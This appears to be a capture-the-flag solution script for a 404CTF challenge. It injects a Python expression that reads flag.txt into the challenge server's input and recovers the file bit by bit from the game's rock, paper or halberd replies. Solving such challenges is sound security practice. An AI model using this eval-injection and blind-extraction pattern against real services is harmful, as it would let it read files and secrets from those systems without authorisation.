import socket
from time import sleep
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('challenge.404ctf.fr', 30806))
rec = s.recv(1024)

flag = "110100 1110000 110100 1000011 1010100 1000110 1111011 1100011 1001000 110000 1101001 1011000 1011111 1101110 1010101 1101101 110011 1110010 110"
i = len(flag)

while True:
    env = b"int('2'.join(format(ord(x), 'b') for x in open('flag.txt', 'r').readline())[" + str(i).encode() + b"]) + 1\n"
    s.send(env)
    rec = s.recv(1024)
    if b"Vous avez choisi : pierre" in rec:
        flag += "0"
    elif b"Vous avez choisi : papier" in rec:
        flag += "1"
    elif b"Vous avez choisi : Hallebarde" in rec:
        flag += " "
    else:
        continue
    sleep(0.2)
    print(flag)
    i += 1
